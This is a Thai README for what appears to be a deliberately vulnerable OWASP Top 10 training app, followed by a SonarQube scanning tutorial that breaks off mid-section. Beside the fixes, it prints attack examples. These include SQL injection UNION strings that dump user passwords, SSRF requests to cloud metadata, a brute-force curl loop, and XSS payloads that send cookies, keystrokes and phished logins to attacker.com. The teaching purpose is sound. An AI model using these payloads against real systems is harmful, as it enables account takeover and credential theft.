# 🛡️ การตรวจสอบความปลอดภัยด้วย SonarQube และ OWASP

<div align="center">
   <img src="https://owasp.org/assets/images/logo.png" width="300">
   <h3>แพลตฟอร์มเรียนรู้ช่องโหว่ความปลอดภัยแบบปฏิบัติจริง</h3>
</div>

## 🌟 บทนำ OWASP

OWASP (Open Web Application Security Project) เป็นองค์กรไม่แสวงหาผลกำไรที่มุ่งเน้นการพัฒนาความปลอดภัยของซอฟต์แวร์ โดยเฉพาะเว็บแอปพลิเคชัน OWASP Top 10 เป็นเอกสารที่รวบรวมภัยคุกคามด้านความปลอดภัยที่พบบ่อยที่สุด 10 อันดับในเว็บแอปพลิเคชัน ซึ่งมีการปรับปรุงทุก 3-4 ปี เพื่อให้สอดคล้องกับภัยคุกคามที่เปลี่ยนแปลงไป

ในปี 2021 OWASP ได้ปรับปรุงรายการภัยคุกคามครั้งล่าสุด โดยมีการเปลี่ยนแปลงที่สำคัญ เช่น การรวม Broken Access Control, Cryptographic Failures และ SSRF เข้ามาในรายการ สะท้อนให้เห็นถึงความเสี่ยงใหม่ๆ ที่เกิดขึ้นในยุคของ cloud computing และ microservices

โปรเจกต์นี้ถูกพัฒนาขึ้นเพื่อให้นักพัฒนา นักทดสอบความปลอดภัย และผู้ที่สนใจ ได้เรียนรู้และเข้าใจช่องโหว่เหล่านี้ผ่านการทดลองจริง โดยจำลองสถานการณ์การโจมตีในสภาพแวดล้อมที่ปลอดภัย


## ช่องโหว่


### 1. SQL Injection

**ไฟล์:** `app.js` (ฟังก์ชัน `/login`)

**คำอธิบาย:** แอปพลิเคชันรวมอินพุตจากผู้ใช้เข้าไปในคำสั่ง SQL โดยตรง โดยไม่มีการป้องกัน ทำให้ผู้ใช้สามารถแทรกคำสั่ง SQL เพื่อเข้าสู่ระบบโดยไม่ต้องรู้รหัสผ่าน

**ตัวอย่างการโจมตี:**
- ชื่อผู้ใช้: `admin' --`
- รหัสผ่าน: (อะไรก็ได้)

**วิธีแก้ไข:** ใช้ Parameterized Queries หรือ Prepared Statements
```javascript
// แก้ไขเป็น
db.get("SELECT * FROM users WHERE username = ? AND password = ?", [username, password], (err, user) => {
  // ...
});
```

### 2. Cross-Site Scripting (XSS)

**ไฟล์:** `app.js` (ฟังก์ชัน `/messages`) และ `public/index.html` (การแสดงข้อความ)

**คำอธิบาย:** แอปพลิเคชันไม่มีการตรวจสอบหรือ sanitize ข้อมูลที่รับเข้ามาจากผู้ใช้ก่อนที่จะนำไปแสดงผล ทำให้สามารถแทรก script ที่จะทำงานบนเบราว์เซอร์ของผู้ใช้งานอื่นได้

**ตัวอย่างการโจมตี:** 
```html
<script>alert('XSS')</script>
```

**วิธีแก้ไข:** ใช้การ sanitize ข้อมูลก่อนนำไปแสดงผล
```javascript
// แก้ไขโดยใช้ escaping library เช่น
const sanitizedMessage = escapeHtml(message);

// หรือใช้ DOM API แทนการใช้ innerHTML
const textNode = document.createTextNode(message);
element.appendChild(textNode);
```

### 3. Insecure Direct Object References (IDOR)

**ไฟล์:** `app.js` (ฟังก์ชัน `/messages/:id`)

**คำอธิบาย:** แอปพลิเคชันอนุญาตให้ผู้ใช้เข้าถึงข้อมูลโดยตรงผ่าน ID โดยไม่มีการตรวจสอบว่าผู้ใช้มีสิทธิ์เข้าถึงข้อมูลนั้นหรือไม่

**วิธีแก้ไข:** เพิ่มการตรวจสอบสิทธิ์ก่อนที่จะให้เข้าถึงข้อมูล
```javascript
// แก้ไขเป็น
const userId = req.cookies.user_id;
db.get("SELECT * FROM messages WHERE id = ? AND (user_id = ? OR user_id IN (SELECT id FROM users WHERE role = 'admin'))", 
  [messageId, userId], (err, message) => {
  // ...
});
```

### 4. Broken Access Control

**ไฟล์:** `app.js` (ฟังก์ชัน `/admin/users`)

**คำอธิบาย:** แอปพลิเคชันตรวจสอบสิทธิ์โดยใช้คุกกี้ที่ผู้ใช้สามารถแก้ไขได้ ทำให้ผู้ใช้ทั่วไปสามารถเปลี่ยนค่าคุกกี้เพื่อเข้าถึงฟังก์ชันของผู้ดูแลระบบได้

**วิธีแก้ไข:** ใช้ session management ที่เหมาะสมและมีการตรวจสอบสิทธิ์ที่ server ทุกครั้ง
```javascript
// แก้ไขโดยใช้ session แทนคุกกี้ธรรมดา
// ต้องเพิ่ม express-session ใน dependencies
const session = require('express-session');
app.use(session({
  secret: 'your-secret-key',
  resave: false,
  saveUninitialized: false,
  cookie: { 
    secure: true, // ใช้กับ HTTPS
    httpOnly: true, 
    sameSite: 'strict'
  }
}));

// และแก้ไขการตรวจสอบสิทธิ์
if (req.session.role === 'admin') {
  // ...
}
```

### 5. การจัดการคุกกี้ที่ไม่ปลอดภัย

**ไฟล์:** `app.js` (ฟังก์ชัน `/login`)

**คำอธิบาย:** แอปพลิเคชันใช้คุกกี้ปกติโดยไม่มีการตั้งค่า security flags เช่น HttpOnly, Secure หรือ SameSite ทำให้คุกกี้ถูกเข้าถึงจาก JavaScript หรือถูกขโมยได้ง่าย

**วิธีแก้ไข:** ตั้งค่าความปลอดภัยให้กับคุกกี้
```javascript
res.cookie('user_id', user.id, { 
  httpOnly: true, 
  secure: process.env.NODE_ENV === 'production', 
  sameSite: 'strict'
});
```

### 6. Cryptographic Failures (การเข้ารหัสที่ไม่ปลอดภัย)

**ไฟล์:** `app.js` (ฟังก์ชัน `/register`)

**คำอธิบาย:** แอปพลิเคชันเก็บรหัสผ่านในรูปแบบ plain text และใช้การเข้ารหัสที่ไม่ปลอดภัย

**ตัวอย่างการโจมตี:**
```javascript
// ดูรหัสผ่านที่เก็บแบบ plain text:
db.get("SELECT password FROM users WHERE username = 'admin'");

// โจมตี weak encryption:
// รหัสผ่านถูกเข้ารหัสด้วย base64 ซึ่งถอดรหัสได้ง่าย
const decodedPassword = Buffer.from(encodedPassword, 'base64').toString();
```

**วิธีแก้ไข:**
```javascript
const bcrypt = require('bcrypt');
const saltRounds = 10;

// เข้ารหัสรหัสผ่านด้วย bcrypt
const hashedPassword = await bcrypt.hash(password, saltRounds);

// เปรียบเทียบรหัสผ่าน
const match = await bcrypt.compare(password, hashedPassword);
```

### 7. Security Misconfiguration (การตั้งค่าความปลอดภัยที่ผิดพลาด)

**ไฟล์:** `app.js` (การตั้งค่า Express)

**คำอธิบาย:** แอปพลิเคชันมีการตั้งค่าที่ไม่ปลอดภัย เช่น เปิด debug mode, ไม่ซ่อน server information

**ตัวอย่างการโจมตี:**
```bash
# ดูข้อมูล error stack trace:
curl http://localhost:3000/undefined-route

# ดูข้อมูล server:
curl -I http://localhost:3000
```

**วิธีแก้ไข:**
```javascript
// ใช้ Helmet เพื่อตั้งค่า HTTP headers
const helmet = require('helmet');
app.use(helmet());

// ปิด debug mode ใน production
if (process.env.NODE_ENV === 'production') {
  app.set('env', 'production');
  app.disable('x-powered-by');
}
```

### 8. Software and Data Integrity Failures (ความล้มเหลวในการตรวจสอบความถูกต้องของซอฟต์แวร์และข้อมูล)

**ไฟล์:** `package.json` และ `app.js`

**คำอธิบาย:** แอปพลิเคชันใช้ dependencies ที่ไม่ปลอดภัยและไม่มีการตรวจสอบความถูกต้องของข้อมูล

**ตัวอย่างการโจมตี:**
```bash
# แทรก malicious package:
npm install evil-package --save

# Prototype pollution:
{"__proto__": {"isAdmin": true}}
```

**วิธีแก้ไข:**
```javascript
// ใช้ Object.freeze() และ Object.seal()
const config = Object.freeze({
  // configuration
});

// ใช้ npm audit และ lockfile
npm audit fix
npm shrinkwrap
```

### 9. Security Logging and Monitoring Failures (ความล้มเหลวในการบันทึกและตรวจสอบความปลอดภัย)

**ไฟล์:** `app.js`

**คำอธิบาย:** แอปพลิเคชันไม่มีการบันทึกกิจกรรมที่สำคัญและไม่มีระบบตรวจจับการโจมตี

**วิธีแก้ไข:**
```javascript
const winston = require('winston');
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  defaultMeta: { service: 'user-service' },
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

// บันทึกความพยายามในการล็อกอิน
app.post('/login', (req, res) => {
  logger.info('Login attempt', {
    username: req.body.username,
    ip: req.ip,
    userAgent: req.headers['user-agent']
  });
  // ...existing code...
});
```

### 10. Server-Side Request Forgery (SSRF)

**ไฟล์:** `app.js` (ฟังก์ชัน `/fetch-data`)

**คำอธิบาย:** แอปพลิเคชันอนุญาตให้ผู้ใช้ระบุ URL ที่ต้องการดึงข้อมูลโดยไม่มีการตรวจสอบ

**ตัวอย่างการโจมตี:**
```javascript
// เข้าถึง internal service:
fetch('/fetch-data?url=http://internal-api/admin')

// เข้าถึง metadata ของ cloud instance:
fetch('/fetch-data?url=http://169.254.169.254/latest/meta-data/')
```

**วิธีแก้ไข:**
```javascript
const isAllowedUrl = (url) => {
  const allowList = [
    'api.example.com',
    'cdn.example.com'
  ];
  const parsedUrl = new URL(url);
  return allowList.includes(parsedUrl.hostname);
};

app.get('/fetch-data', async (req, res) => {
  const { url } = req.query;
  if (!isAllowedUrl(url)) {
    return res.status(403).json({ error: 'URL ไม่ได้รับอนุญาต' });
  }
  // ...fetch data...
});
```

## 🎯 การทดสอบแบบละเอียด

### 1. SQL Injection (ระดับความเสี่ยง: สูง)

#### ตัวอย่างการโจมตีแบบพื้นฐาน:
```sql
username: admin' --
password: อะไรก็ได้
```

#### ตัวอย่างการโจมตีแบบซับซ้อน:
```sql
# 1. ดึงข้อมูล version ของ SQLite:
username: ' UNION SELECT 1,sqlite_version(),3,4--

# 2. ดึงรายชื่อตารางทั้งหมด:
username: ' UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table'--

# 3. ดึงข้อมูลผู้ใช้ทั้งหมดพร้อมรหัสผ่าน:
username: ' UNION SELECT id,username,password,role FROM users--
```

#### ผลกระทบ:
- เข้าถึงข้อมูลผู้ใช้ทั้งหมด
- แก้ไขหรือลบข้อมูลในฐานข้อมูล
- ยกระดับสิทธิ์เป็น admin

### 2. Cross-Site Scripting (XSS) (ระดับความเสี่ยง: ปานกลาง-สูง)

#### ตัวอย่างการโจมตี:
```javascript
// 1. การขโมย Cookie:
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

// 2. การติดตั้ง Keylogger:
<script>
document.addEventListener('keyup', function(e) {
  fetch('https://attacker.com/keys?k='+e.key)
});
</script>

// 3. การปลอมแปลงหน้าเว็บ:
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white">
  <h2>กรุณาเข้าสู่ระบบอีกครั้ง</h2>
  <form onsubmit="fetch('https://attacker.com/steal',{
    method:'POST',
    body:JSON.stringify({
      user:this.username.value,
      pass:this.password.value
    })
  });return false">
    <input name="username">
    <input name="password" type="password">
    <button>เข้าสู่ระบบ</button>
  </form>
</div>
```

### 3. Broken Authentication (ระดับความเสี่ยง: สูง)

#### การโจมตีแบบ Brute Force:
```bash
# ทดสอบรหัสผ่านจากไฟล์ passwords.txt:
while read password; do
  curl -X POST http://localhost:3000/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$password\"}"
done < passwords.txt
```

## 🔧 การรันทดสอบอัตโนมัติ

เราได้เตรียมสคริปต์ทดสอบอัตโนมัติไว้ให้:

```bash
# รันทดสอบทั้งหมด
./test.sh

# รันทดสอบเฉพาะ SQL Injection
./test.sh sql

# รันทดสอบเฉพาะ XSS
./test.sh xss
```

## 🧪 การทดสอบช่องโหว่

โปรเจกต์นี้มี UI สำหรับทดสอบช่องโหว่แต่ละประเภท ผู้ใช้สามารถลองโจมตีแอปพลิเคชันด้วยวิธีต่างๆ ตามคำแนะนำในหน้าเว็บ

## 📚 ทรัพยากรที่เกี่ยวข้อง

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [NodeJS Security Best Practices](https://github.com/goldbergyoni/nodebestpractices#6-security-best-practices)

## 📚 แหล่งข้อมูลเพิ่มเติมสำหรับการศึกษา

### เอกสารอ้างอิงหลัก
- [OWASP Top 10:2021](https://owasp.org/Top10/) - เอกสารอ้างอิงหลักเกี่ยวกับภัยคุกคามที่พบบ่อย
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) - คู่มือการทดสอบความปลอดภัยแบบละเอียด
- [OWASP Security Knowledge Framework](https://owasp.org/www-project-security-knowledge-framework/) - เฟรมเวิร์คสำหรับการเรียนรู้ความปลอดภัย

### หลักสูตรและการฝึกอบรม
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - หลักสูตรฟรีพร้อมแลปปฏิบัติการ
- [SANS Security Awareness](https://www.sans.org/security-awareness-training/) - การฝึกอบรมด้านความปลอดภัยระดับมืออาชีพ
- [Hack The Box](https://www.hackthebox.com/) - แพลตฟอร์มฝึกฝนทักษะ penetration testing

### เครื่องมือและทรัพยากร
- [OWASP ZAP](https://www.zaproxy.org/) - เครื่องมือทดสอบความปลอดภัยฟรี
- [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload) - เครื่องมือทดสอบความปลอดภัยยอดนิยม
- [Security Headers](https://securityheaders.com/) - ตรวจสอบการตั้งค่า HTTP Headers

### บทความและบล็อก
- [Security Boulevard](https://securityboulevard.com/) - ข่าวสารและบทความด้านความปลอดภัย
- [Troy Hunt's Blog](https://www.troyhunt.com/) - บล็อกด้านความปลอดภัยที่มีชื่อเสียง
- [The Daily Swig](https://portswigger.net/daily-swig) - ข่าวสารด้านความปลอดภัยประจำวัน

### ชุมชนและกลุ่มศึกษา
- [OWASP Thailand](https://owasp.org/www-chapter-thailand/) - ชุมชน OWASP ในประเทศไทย
- [Reddit /r/netsec](https://www.reddit.com/r/netsec/) - ชุมชนด้านความปลอดภัยบน Reddit
- [Security StackExchange](https://security.stackexchange.com/) - Q&A ด้านความปลอดภัย

⚠️ **หมายเหตุ**: แหล่งข้อมูลเหล่านี้มีการปรับปรุงอยู่เสมอ ควรตรวจสอบเวอร์ชันล่าสุดจากเว็บไซต์โดยตรง

## 📝 การตรวจสอบความปลอดภัยด้วย SonarQube

| รายละเอียด | คำอธิบาย |
|----------|---------|
| **ชื่อเนื้อหา** | การตรวจสอบความปลอดภัยด้วย SonarQube และ OWASP |
| **วัตถุประสงค์** | เรียนรู้การใช้งาน SonarQube ในการตรวจสอบคุณภาพโค้ดและความปลอดภัยตามมาตรฐาน OWASP |
| **ระดับความยาก** | ปานกลาง |

## 📝 บทนำ SonarQube

SonarQube เป็นเครื่องมือที่ใช้ในการวิเคราะห์คุณภาพโค้ดแบบอัตโนมัติ (Static Code Analysis) ที่ช่วยในการตรวจจับปัญหาด้านความปลอดภัย คุณภาพโค้ด และช่องโหว่ต่างๆ ในการพัฒนาซอฟต์แวร์

### สถิติช่องโหว่ OWASP Top 10 ที่พบบ่อย

```mermaid
pie
    title "OWASP Top 10 Vulnerabilities"
    "Broken Access Control" : 34
    "Cryptographic Failures" : 26
    "Injection" : 33
    "Insecure Design" : 24
    "Security Misconfiguration" : 21
    "Vulnerable Components" : 20
    "Auth Failures" : 16
    "Data Integrity Failures" : 13
    "Security Logging Failures" : 11
    "SSRF" : 9
```

### ที่มาและความสำคัญ
การพัฒนาซอฟต์แวร์ในปัจจุบันเผชิญกับความท้าทายด้านความปลอดภัยที่เพิ่มขึ้นอย่างต่อเนื่อง:
- 🔍 พบช่องโหว่ด้านความปลอดภัยเฉลี่ย 3-5 จุดต่อ 1,000 บรรทัดโค้ด
- 💰 ค่าใช้จ่ายในการแก้ไขปัญหาหลังจากระบบ Production สูงกว่าช่วงพัฒนาถึง 30 เท่า
- ⏰ การตรวจพบปัญหาเร็วในช่วงพัฒนาช่วยลดความเสี่ยงและต้นทุนได้อย่างมาก

### ทำไมต้องเลือก SonarQube?
1. **การวิเคราะห์แบบครอบคลุม**
   - ตรวจสอบได้หลายภาษาโปรแกรมมิ่ง
   - วิเคราะห์ทั้ง Security, Quality, Maintainability
   - รองรับการทำงานร่วมกับ CI/CD pipeline

2. **มาตรฐานและการรายงาน**
   - สอดคล้องกับมาตรฐาน OWASP Top 10
   - รายงานผลแบบ Real-time
   - แสดงแนวทางการแก้ไขที่ชัดเจน

3. **การใช้งานและการบำรุงรักษา**
   - ติดตั้งและใช้งานง่าย
   - มี Community Edition ที่ใช้งานฟรี
   - อัปเดตกฎความปลอดภัยสม่ำเสมอ

### ทำไมต้องใช้ SonarQube?
- ตรวจจับปัญหาความปลอดภัยตั้งแต่ขั้นตอนการพัฒนา
- ลดค่าใช้จ่ายในการแก้ไขปัญหาในภายหลัง
- สร้างมาตรฐานการเขียนโค้ดในทีม
- ติดตามคุณภาพโค้ดได้อย่างต่อเนื่อง

## 📋 กรณีศึกษา

1. [**การตรวจสอบพื้นฐาน**](./basic-scan/README.md)
   - การตั้งค่าโปรเจค
   - การตรวจสอบ Code Smells
   - การวิเคราะห์ Technical Debt

2. [**การวิเคราะห์ตาม OWASP Top 10**](./owasp-scan/README.md)
   - การตรวจสอบช่องโหว่ตาม OWASP
   - การจัดการ Security Hotspots
   - แนวทางการแก้ไขปัญหา

## 🛠️ การเตรียมความพร้อม

### ความต้องการของระบบ
- Docker และ Docker Compose
- SonarQube Community Edition หรือสูงกว่า
- Java 11 ขึ้นไป
- หน่วยความจำอย่างน้อย 4GB
- พื้นที่ว่างอย่างน้อย 5GB

## การติดตั้ง SonarQube

1. เริ่มต้น SonarQube server:
```bash
docker-compose up -d sonarqube
```

2. เข้าถึง SonarQube:
   - URL: http://localhost:9000
   - รหัสเริ่มต้น: admin/admin
   - ควรเปลี่ยนรหัสผ่านทันทีหลังเข้าใช้งานครั้งแรก

3. ติดตั้ง OWASP Plugin:
   - ไปที่ Administration > Marketplace
   - ค้นหาและติดตั้ง "OWASP Security Rules"
   - รีสตาร์ท SonarQube

## 🔍 การใช้งาน

### การสร้าง Token
1. เข้าสู่ระบบ SonarQube ด้วยบัญชี admin
2. ไปที่ User > My Account > Security
3. กรอกชื่อ token ที่ต้องการ (เช่น "project-scanner")
4. คลิก Generate และบันทึก token ไว้ (token จะแสดงเพียงครั้งเดียวเท่านั้น)

### การเตรียม Project
1. สร้าง Project ใน SonarQube:
   - ไปที่ Projects > Create Project
   - ตั้งชื่อ Project Key และ Display Name
   - เลือก "Locally" สำหรับการสแกนในเครื่อง

2. สร้างไฟล์ `sonar-project.properties` ในโปรเจค:
```properties
sonar.projectKey=my-project
sonar.projectName=My Project
sonar.sources=src
sonar.sourceEncoding=UTF-8
sonar.host.url=http://localhost:9000
sonar.login=your-token-here
# Optional configurations
sonar.tests=tests
sonar.javascript.lcov.reportPaths=coverage/lcov.info
sonar.coverage.exclusions=**/*.test.js,**/*.spec.js
```

### วิธีการสแกน

#### 1. การสแกนด้วย Docker (แนะนำ):
```bash
# สแกนโปรเจคทั้งหมด
docker run \
    --network=host \
    -v "$(pwd):/usr/src" \
    sonarsource/sonar-scanner-cli \
    -Dsonar.projectKey=my-project \
    -Dsonar.sources=. \
    -Dsonar.host.url=http://localhost:9000 \
    -Dsonar.login=your-token

# สแกนเฉพาะโฟลเดอร์
docker run \
    --network=host \
    -v "$(pwd)/src:/usr/src" \
    sonarsource/sonar-scanner-cli \
    -Dsonar.projectKey=my-project \
    -Dsonar.sources=. \
    -Dsonar.host.url=http://localhost:9000 \
    -Dsonar.login=your-token
```

#### 2. การสแกนด้วย SonarScanner CLI:
```bash